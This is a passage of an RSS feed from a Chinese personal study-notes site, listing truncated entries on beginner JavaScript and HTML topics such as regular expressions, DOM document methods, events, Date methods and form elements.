      <description>RegExp 方法 exec() 如果匹配模式带有g修饰符，则每匹配一次，匹配结束的位置就是下一次匹配的起始位置。
如果匹配模式不带g修饰符，则不管匹配多少次，匹配的起始位置始终都只从lastIndex = 0开始。即不管匹配多少次，lastIndex 都只为 0。
加 g 修饰符 // 加 g 修饰符 var reg = /ab/g;  var str = &amp;#39;abababab&amp;#39;;  // 第一次匹配，lastIndex 从 0 开始匹配，匹配完后 lastIndex = 2 console.log(reg.exec(str));  // 第二次匹配，lastIndex 从 2 开始匹配，匹配完后 lastIndex = 4 console.log(reg.exec(str));  // 第三次匹配，lastIndex 从 4 开始匹配，匹配完后 lastIndex = 6 console.log(reg.exec(str));  // 第四次匹配，lastIndex 从 6 开始匹配，匹配后 lastIndex = 8 console.log(reg.exec(str));  // 第五次匹配，lastIndex 从 8 开始匹配， // 因为从 8 开始匹配，无法匹配到任何值，因此此处返回 null // 返回 null 之后，lastIndex 从起始位置 0 开始，即现在的 lastIndex = 0， console.</description>
    </item>
    
    <item>
      <title>RegExp 普通字符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</guid>
      <description>普通字符 () 匹配与()中的字表达式相同的字符。可以用()来标记一个子表达式的开始和结束位置，后面我们可以用\1（反向引用）来引用第一个()中的字表达式。
// 表示匹配与 \w 相同的四个连续的字符 var reg = /(\w)\1\1\1/g;  var str = &amp;#39;aaaabbbbccccc&amp;#39;;  var result = str.match(reg);  console.log(result); 也可以使用\2来引用第二个子表达式：
var reg = /(\w)\1(\w)\2/g;  var str = &amp;#39;ccddvvffff&amp;#39;;  var result = str.match(reg);  console.log(result); 普通字符 () 标记一个子表达式的开始和结束位置，即匹配与()中的字表达式相同的字符，之后我们可以用\1（反向引用）来引用第一个()中的字表达式。
// 表示匹配与 \w 相同的四个连续的字符 var reg = /(\w)\1\1\1/g;  var str = &amp;#39;aaaabbbbccccc&amp;#39;;  var result = str.match(reg);  console.log(result); 也可以使用\2来引用第二个子表达式：
var reg = /(\w)\1(\w)\2/g;  var str = &amp;#39;ccddvvffff&amp;#39;;  var result = str.</description>
    </item>
    
    <item>
      <title>JavaScript Document</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document/</link>
      <pubDate>Sat, 07 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document/</guid>
      <description>Document Document 是文档的根，表示整个文档，它包含所有元素，包括 html 元素。</description>
    </item>
    
    <item>
      <title>JavaScript Document 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Sat, 07 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E5%B1%9E%E6%80%A7/</guid>
      <description>Document 属性 head 和 body 表示文档中的 head 和 body 元素。
document.head; document.body; documentElement 表示文档中的 html 元素。
document.documentElement; </description>
    </item>
    
    <item>
      <title>JavaScript Document 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 07 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E6%96%B9%E6%B3%95/</guid>
      <description>Document 方法 查找节点 使用 querySelectorAll 和 querySelector 方法选择的元素不是实时的，而使用 getElements 方法选择的元素是实时的。
比如，使用 querySelecto 选择 div 元素，并存放到 ele 变量中，如果后面我们在文档中删除或增加一个 div 元素，ele 中的 div 元素依旧不变。
getElementById() 选择文档中指定 id 的元素，id 是唯一的，所以是 getElement，不是 getElements
var ele = document.getElementById(&amp;#39;only&amp;#39;); getElementsByTagName() 选择文档中指定标签名的元素，返回结果是一个类数组
var ele = document.getElementsByTagName(&amp;#39;span&amp;#39;); getElementsByTagName(&amp;rsquo;*&#39;) 选择文档中的所有元素。
var ele = document.getElementsByTagName(&amp;#39;*&amp;#39;); getElementsByName() 选择文档中指定 name 的元素，ele 是一个类数组，需要注意，该元素只有部分元素才能生效
var ele = document.getElementsByName(&amp;#39;span&amp;#39;); getElementsByClassName() 选择文档中指定 class 的元素
var ele = document.getElementsByClassName(&amp;#39;build&amp;#39;); querySelector() 选择匹配指定选择器的第一个元素。不实时
var ele = document.querySelector(&amp;#39;div &amp;gt; span a .</description>
    </item>
    
    <item>
      <title>HTML 伪元素和伪类</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E4%BC%AA%E5%85%83%E7%B4%A0%E5%92%8C%E4%BC%AA%E7%B1%BB/</link>
      <pubDate>Fri, 06 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E4%BC%AA%E5%85%83%E7%B4%A0%E5%92%8C%E4%BC%AA%E7%B1%BB/</guid>
      <description>伪元素和伪类 伪类选择器和伪元素选择器都是 CSS 选择器的一种。
伪类选择器使用:开头。
伪元素选择器使用::开头
伪类 用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态根据用户行为而动态变化。
比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。虽然它和普通的 css 类相似，可以为已有的元素添加样式，但是它只有处于 DOM 树无法描述的状态下才能为元素添加样式，所以将其称为伪类。
伪元素 伪元素用于创建一些不在 DOM 树中的元素（虚拟元素），并为其添加其 CSS 样式。伪元素开头为双冒号::。
比如说，我们可以用::before或::after在一个元素的前面或后面增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在 DOM 树中，因为他们都是虚拟的元素。
 </description>
    </item>
    
    <item>
      <title>HTML DOCTYPE</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/doctype/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/doctype/</guid>
      <description>DOCTYPE 用来告知浏览器该使用了哪种渲染方式来渲染当前文档。
文档首行是&amp;lt;!DOCTYPE html&amp;gt;，则浏览器渲染模式为标准模式；首行不是或没有&amp;lt;!DOCTYPE html&amp;gt;则浏览器的渲染模式为怪异模式。
目前浏览器的渲染引擎使用三种模式：怪异模式、接近标准模式、以及标准模式。
历史问题 在很久以前的网络上，页面通常有两种版本：为网景的 Navigator 准备的版本，以及为微软的 Internet Explorer 准备的版本。
当 W3C 创立网络标准后，为了不破坏当时既有的网站，浏览器不能直接弃用这些标准。因此，浏览器采用了两种模式，用以把能符合新规范的网站和老旧网站区分开。
标准模式 在标准模式下，行为即由 HTML 与 CSS 的规范描述的行为。
在接近标准模式下，只有少数的怪异行为被实现。
怪异模式 在怪异模式下，文档会兼容之前的网页。也叫混杂模式。
compatMode 返回当前浏览器采用的渲染方式。
BackCompat 标准兼容模式关闭，当 document.compatMode 等于 BackCompat 时，浏览器客户区宽度为 document.body.clientWidth;
CSS1Compat 标准兼容模式开启,当 document.compatMode 等于 CSS1Compat 时浏览器客户区宽度为 document.documentElement.clientWidth;</description>
    </item>
    
    <item>
      <title>HTML 表单元素</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/</guid>
      <description>表单元素 label 关联指定的表单元素。
for 为需要关联的元素 id，关联之后，当点击label 时，也可以聚焦到label所关联的元素。
&amp;lt;label for=&amp;#34;account&amp;#34;&amp;gt;账号：&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;account&amp;#34; /&amp;gt; select 下拉列表。
option 定义下拉列表中可选择的选项。
通过添加 selected 属性来定义默认选项。
&amp;lt;select name=&amp;#34;cars&amp;#34;&amp;gt; 	&amp;lt;option value=&amp;#34;volvo&amp;#34; selected&amp;gt;Volvo&amp;lt;/option&amp;gt; 	&amp;lt;option value=&amp;#34;saab&amp;#34;&amp;gt;Saab&amp;lt;/option&amp;gt; 	&amp;lt;option value=&amp;#34;fiat&amp;#34;&amp;gt;Fiat&amp;lt;/option&amp;gt; 	&amp;lt;option value=&amp;#34;audi&amp;#34;&amp;gt;Audi&amp;lt;/option&amp;gt; &amp;lt;/select&amp;gt; textarea 文本域（多行输入框）。
&amp;lt;textarea name=&amp;#34;message&amp;#34; rows=&amp;#34;10&amp;#34; cols=&amp;#34;30&amp;#34;&amp;gt; The cat was playing in the garden. &amp;lt;/textarea&amp;gt; button 按钮。
&amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;alert(&amp;#39;Hello World!&amp;#39;)&amp;#34;&amp;gt;Click Me!&amp;lt;/button&amp;gt; datalist datalist为 input 设置预定义的下拉列表。
input 获取焦点时，可以看到预定义的下拉列表。
input 的 list 属性必须为 datalist的 id。</description>
    </item>
    
    <item>
      <title>JavaScript Date</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/date/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/date/</guid>
      <description>Date 创建一个 Date 实例，该实例呈现时间中的某个时刻。
Date 对象基于格林威治 Unix Time Stamp，即自 1970 年 1 月 1 日（UTC）起经过的毫秒数。
Date 对象有大量的设置、获取和操作日期的方法。 但它并不含有任何属性。
Date 对象中存放的都是被构造出来的那一刻的时间，而不是随着系统时间改变而改变。</description>
    </item>
    
    <item>
      <title>JavaScript Element</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element/</guid>
      <description>Element 用来遍历元素节点。</description>
    </item>
    
    <item>
      <title>JavaScript Event</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E6%96%B9%E6%B3%95/</guid>
      <description>Event stopPropagation() 用于取消事件的捕获和冒泡，W3C 推荐的方法。
cancelBubble() 功能与stopPropagation()相同， IE 独有，但在 Chrome 中也可以用。
var wrapper = document.getElementsByClassName(&amp;#39;wrapper&amp;#39;)[0];  document.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;document&amp;#39;); 	}, 	false );  wrapper.addEventListener( 	&amp;#39;click&amp;#39;, 	function (event) { 	console.log(&amp;#39;点击了子元素&amp;#39;);  	event.stopPropagation(); 	// IE 独有，但 Chrome 也可以使用 	event.cancelBubble = true; 	}, 	false ); </description>
    </item>
    
    <item>
      <title>JavaScript Event</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event/</guid>
      <description>Event 表示在 DOM 中出现的事件。</description>
    </item>
    
    <item>
      <title>JavaScript Event 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E5%B1%9E%E6%80%A7/</guid>
      <description>Event 属性 target 返回触发当前事件的事件源对象。
document.onclick = function (event) { 	console.log(event.target); }; </description>
    </item>
    
    <item>
      <title>JavaScript EventTarget</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/eventtarget/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/eventtarget/</guid>
      <description>EventTarget addEventListener() 监听一个对象，并给这个对象绑定指定的事件处理函数。
第一个参数是事件类型，第二个参数是事件的回调回函数。
this 的指向是 DOM 元素本身，第三个参数是一个布尔值，用于定义该对象应该使用哪一种事件处理模型（冒泡、捕获）进行触发。
优点 可以给同一个对象同一类型事件绑定多个事件处理函数，并且会按绑定事件的先后顺序去执行。
// 旧事件 div.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;第一个事件&amp;#39;); 	}, 	false ); // 新事件，不会fu div.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;第二个事件&amp;#39;); 	}, 	false ); attachEvent() IE 独有事件，它与 addEventListener() 差不多。
this 指向 window。
for 绑定 addEventListener() 事件 var li = document.getElementsByTagName(&amp;#39;li&amp;#39;);  var len = li.length; for (var i = 0; i &amp;lt; len; i++) { 	// 用立即执行函数解决闭包内存泄漏的问题 	(function (i) { 	li[i].</description>
    </item>
    
    <item>
      <title>JavaScript get 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/get-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/get-%E6%96%B9%E6%B3%95/</guid>
      <description>get 方法 getDate() 返回一个月中的某天 1 — 31
getDay() 返回一周中的某天 0 — 6。
注意，0 表示周一，6 表示周日。
getMonth() 返回一年终的某月 0 — 11。
注意，0 表示一月，11 表示 12 月
getFullYear() 获取四位数的年份 XXXX。
以前是用的 getYear() 方法，因为以前表示日期用的六位制 YY.MM.DD，直到 1999 年 12 月 31 日之后，变成了 2000 年，这个时候的日期用六位制已经无法表示了，因此，现在改用八位制 YYYY.MM.DD。
getHours() 获取小时 0 — 23
getMinutes() 获取分 0 — 59
getSeconds() 获取秒 0 — 59
getMilliseconds() 获取毫秒 0 — 999
getTime() 获取毫秒（从格林威治时间 1970 年 1 月 1 日至今的毫秒数），也叫获取时间戳。
时间戳 用于验证执行某个程序所花费的毫秒数。</description>
    </item>
    
    <item>
      <title>JavaScript GlobalEventHandlers</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/globaleventhandlers/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/globaleventhandlers/</guid>
      <description>GlobalEventHandlers 全局事件句柄，在 JavaScrip 中，为了将属性和事件区分开，所有事件的命名都是小写的，而不是像属性那样用小驼峰式命名。
onclick 当指定元素被点击时，所触发的事件。它的兼容性非常好。
基本等于将事件写到 HTML 元素的onclick内联属性上。
this 的指向是 DOM 元素本身。
只能监听鼠标左键，无法监听右键和滚轮。
onmousedown + onmouseup = onclick
缺点 一个元素只能绑定一个事件，如果给这个元素定义新的事件，那么新的事件会覆盖旧的事件。
var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  // 旧事件 div.onclick = function () { 	console.log(&amp;#39;旧事件&amp;#39;); }; // 新事件，会覆盖旧事件 div.onclick = function () { 	console.log(&amp;#39;新s&amp;#39;); }; 点击事件只触发一次 div.onclick = function () { 	console.log(4555); 	// 使 onclick 事件只能被触发一次 	div.onclick = null; }; oncontextmenu 鼠标右键单击指定对象时，所触发的事件。
onmousemove 鼠标移动到指定对象上时，所触发的事件。
onmousedown 鼠标按下指定对象时，所触发的事件。</description>
    </item>
    
    <item>
      <title>JavaScript HTMLElement 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement-%E5%B1%9E%E6%80%A7/</guid>
      <description>HTMLElement 属性 innerText/textContent 设置或获取指定元素所包含的文本信息，只返文本信息，不返回所包含的元素。
另外，设置元素内容的时候，如果元素内容中有子元素，则这些子元素也会被覆盖。
innerText 很容易 与 textContent 混淆, 但这两个属性间实际上有很重要的区别. 大体来说, innerText 可操作已被渲染的内容， 而 textContent 则不会。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; // 设置内容 div.innerText = &amp;#39;123&amp;#39;; /textContent div.textContent = &amp;#39;456&amp;#39;; offsetHeight 它返回该元素的像素高度，高度包含该元素的垂直内边距和边框，且是一个整数。
offsetWidth 它返回该元素的像素宽度，宽度包含该元素的水平内边距和边框，且是一个整数。
offsetLeft 返回当前元素左边界相对于最近的定位父元素的左边界的像素值。该值包含 border
如果当前元素的父元素中没有定位元素，则返回相对文档左边界的像素值。
offsetTop 它返回当前元素顶边界相对于最近的定位父元素的顶边界的像素值。该值包含 border
如果当前元素的父元素中没有定位元素，则返回相对文档左边界的像素值。
offsetParent 返回距离当前元素最近的定位父元素。
如果当前元素的父元素中没有定位元素，则返回 body。
style 设置或返回 ele 的内联样式表中的 attr，并不会返回内嵌样式表和外链样式表中的 CSS 属性。
设置的值必须为字符串格式。
如果是设置 float 这样的保留字属性，则尽量使用 cssFloat ，虽然也可以使用 float 设置，但是 W3C 并不建议使用 float，因为 float 是一个保留字，未来可能会成为关键字，避免未来的命名冲突。</description>
    </item>
    
    <item>
      <title>JavaScript set 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/set-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/set-%E6%96%B9%E6%B3%95/</guid>
      <description>set 方法 setDate() 以数值 1-31 设置日
var date = new Date(); // 设置日期中的第 18 天 var d = date.setDate(18); console.log(d); // 输出被更改后的时间戳，因为日变了，所以日对应的周也会跟着变。 console.log(date); 定时执行某个代码
用 set 方法设置一个未来的时间点，然后判断当 getTime() 的毫秒数与 set 的毫秒数相差小于 1000 的时候，相当于此刻的时间点已经和设置的时间点重合，可以执行一些需要在这个时间点所执行的操作。
用它可以实现倒计时抢漏、闹钟等功能。
setTime() 设置从 1970 年 1 月 1 日至今的毫秒数。
var date = new Date(); // 将 date 设置为从格林威治时间至今的毫秒数（毫秒数会转换为日期） date.setTime(12343546557501); // 返回设置的日期 console.log(date); 闹钟 var date = new Date(); // 设置未来的某个时间点的分和秒，当格林威治时间到达我们设置的时间戳，会执行某个操作 date.setMinutes(10); date.setSeconds(5);  // 定时器，每隔 1000 毫秒会执行一次回调函数 setInterval(function () { 	// 判断格林威治时间是否和设置的时间点相差小于 1000 毫秒（小于 1000 毫秒则表示格林威治时间已经到大我们设置的时间戳） 	if (new Date().</description>
    </item>
    
    <item>
      <title>JavaScript String 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/string/string-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/string/string-%E6%96%B9%E6%B3%95/</guid>
      <description>String 方法 fromCharCode() 将 UTF-16 组成的值转换为一个字符串。
match() 检索并返回字符串匹配正则表达式的结果。
参数通常是一个正则表达式，
var reg = /ab/g;  var str = &amp;#39;abababababab&amp;#39;;  var result = str.match(reg); console.log(result); slice() 从字符串的第 n 位字符开始截取，一直截取到字符串最末。并返回一个新的字符串，且不会改动原字符串。
search() 返回子字符串在字符串中的起始位置（索引值）这个字符串也可以使正则表达式。
匹配失败返回 -1。
var str = &amp;#39;eedsddvv&amp;#39;;  var reg = /(\w)\1(\w)\2/g;  var result = str.search(reg);  console.log(result); split() 使用指定的分隔符字符串将一个字符串对象分割成子字符串数组，以一个指定的分割字串来决定每个拆分的位置。
除了会返回匹配结果，还会返回()中第一次匹配的子表达式的值，并且这些值是类数组的数据位，它们存在于类数组的索引位中。
var str = &amp;#39;dfjajfdsssajfiovvdsafjttidjf&amp;#39;;  var reg = /(\w)\1/g;  var result = str.split(reg);  console.log(result); 用数之来分割字符串 var str = &amp;#39;dfjajfdss0sajfiovvds0afjttidjf&amp;#39;;  var reg = /\d/g;  var result = str.</description>
    </item>
    
    <item>
      <title>JavaScript Window 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E5%B1%9E%E6%80%A7/</guid>
      <description>Window 属性 innerWidth 和 innerHeight 返回视口的宽度和高度。
视口就是浏览器中能看到网页的部分。
// 视口宽度 var WViewport = window.innerWidth; // 视口高度 var HViewport = window.innerHeight; console.log(&amp;#39;视口宽度：&amp;#39; + WViewport); console.log(&amp;#39;视口高度：&amp;#39; + HViewport); pageYOffset 和 pageXOffset 返回滚动条当前的纵向滚动距离和横向滚动距离。
// 纵向滚动条的滚动距离 var Ydistance = window.pageYOffset; // 横向滚动条的滚动距离 var Xdistance = window.pageXOffset; console.log(Ydistance); console.log(Xdistance); IE 8 及 IE 8 以下的浏览器 document.body.scrollLeft/Top 和 document.documentElement.scorllLeft/Top这个两个属性的兼容性机器混乱，Top 代表纵向，Left 代表横向
在 IE 8 及 IE 8 以下的浏览器中，这两个属性中只要其中一个有值，则另一个属性的值一定为 0。因此， 如果我们要考虑兼容性的问题，都会将这两个属性相加，以兼容 IE 8 及其 IE 8 以下的浏览器。
DOMContentLoaded 文档解析完成后执行的事件。</description>
    </item>
    
    <item>
      <title>JavaScript Window 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E6%96%B9%E6%B3%95/</guid>
      <description>Window 方法 scroll() 和 scrollTo() 使文档的滚动条滚动至文档中的特定位置。
//让水平的滚动条滚动到 100 像素的位置，再让垂直滚动条滚动到 200 像素的位置 scrollTo(100, 200); scrollBy() 使文档的滚动条按指定的偏移量滚动。
//　让垂直滚动条滚动 10px， scrollTo(0, 10); // 重复执行的话，滚动条会再滚动 10px scrollTo(0, 10); getComputedStyle() 返回指定元素经过计算后的 CSS 样式,，且返回的值都是绝对值，它是一个只读属性。
返回的样式是元素在浏览器中最终渲染效果的样式。
第一个参数是元素，第二个参数是伪元素。
getComputedStyle() 的第二个参数可以获取第一个参数（元素）的伪元素（::before、::after等）的 CSS 样式。
第二个参数不是必须的，当不查询元素的伪元素的时候可以忽略或者传入 null。
currentStyle 只读属性，返回的 CSS 属性的值没有经过计算。IE 独有属性。
获取指定元素的指定 CSS 属性 var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  function GetStyle(elem, name) { 	if (window.getComputedStyle) { 	return window.getComputedStyle(elem, null)[name]; 	} else { 	return elem.currentStyle[name]; 	} } setInterval() 用于每隔一段时间调用一个函数或一个代码片段。</description>
    </item>
    
    <item>
      <title>JavaScript 事件句柄</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%8F%A5%E6%9F%84/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%8F%A5%E6%9F%84/</guid>
      <description>事件句柄 事件发生时进行的操作。
事件句柄就是一个将元素的特定事件与某个函数关联起来，比如 onclick、onmouseover 等都是事件句柄，它们会指向一个给定的函数，如果事件发生，那么就会执行此函数。
document.oncontextmenu = function () { 	console.log(&amp;#39;鼠标右击事件句柄&amp;#39;); }; document.onclick = function () { 	console.log(&amp;#39;点击事件句柄&amp;#39;); }; </description>
    </item>
    
    <item>
      <title>JavaScript 事件处理模型</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%A8%A1%E5%9E%8B/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%A8%A1%E5%9E%8B/</guid>
      <description>事件处理模型 一个对象的一个事件类型，只能触发一种事件处理模型，也就是要么触发事件冒泡，要么触发事件捕获。
另外，并不是所有事件都存冒泡，比如 focus、blur、change、submit、reset、select 等事件。
事件冒泡 结构上（非视觉上）为嵌套关系的元素，会存在事件冒泡的情况。即同一类型的事件，触发事件源，事件会以由内（事件源）至外的顺序被触发。
HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  * {  margin: 0;  padding: 0;  }   .wrapper {  width: 300px;  height: 300px;  background-color: rgb(183, 43, 43);  }   .content {  width: 200px;  height: 200px;  background-color: rgb(12, 175, 200);  }   .</description>
    </item>
    
    <item>
      <title>JavaScript 事件对象</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1/</guid>
      <description>事件对象 在 DOM 中发生事件时，所有相关信息都会被收集并存储在一个名为**event **的对象中。这个对象包含了一些基本信息，比如导致事件的元素、发生的事件类型、可能与特定事件相关的任何其他数据等。
每个事件处理函数都有一个形参 event，这个 **event **就可以在函数中被当做 event 对象来使用。
// event 是一个参数，系统会自动将事件对象传给他。 document.onclick = function (event) { 	console.log(event); }; srcElement 表示触发当前事件的事件源对象。
可以用event.target来获取事件的 srcElement。
Button 表示触发当前事件是鼠标的左键还是右键，又或者是滚轮。
0 表示鼠标左键，1 表示鼠标滚轮，2 表示鼠标右键。
div.onmousedown = function (event) { 	if (event.button == 0) { 	console.log(&amp;#39;Left Click&amp;#39;); 	} else if (event.button == 1) { 	console.log(&amp;#39;Roller&amp;#39;); 	} else if (event.button == 2) { 	console.log(&amp;#39;Right Click&amp;#39;); 	} }; charCode 键盘事件的事件对象上的属性，返回按下的键的 ASCII 码 。</description>
    </item>
    
    <item>
      <title>JavaScript 区分点击事件与长按事件</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E5%8C%BA%E5%88%86%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6%E4%B8%8E%E9%95%BF%E6%8C%89%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E5%8C%BA%E5%88%86%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6%E4%B8%8E%E9%95%BF%E6%8C%89%E4%BA%8B%E4%BB%B6/</guid>
      <description>区分点击事件与长按事件 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;title&amp;gt;区分点击事件与长按事件.m&amp;lt;/title&amp;gt; 	&amp;lt;style&amp;gt; 	div { 	width: 100px; 	height: 100px; 	background-color: rgb(15, 190, 131); 	} 	&amp;lt;/style&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;div style=&amp;#34;position:absolute;left:0;top:0;&amp;#34;&amp;gt;该拖曳只对内联样式有效&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; JavaScrip var div = 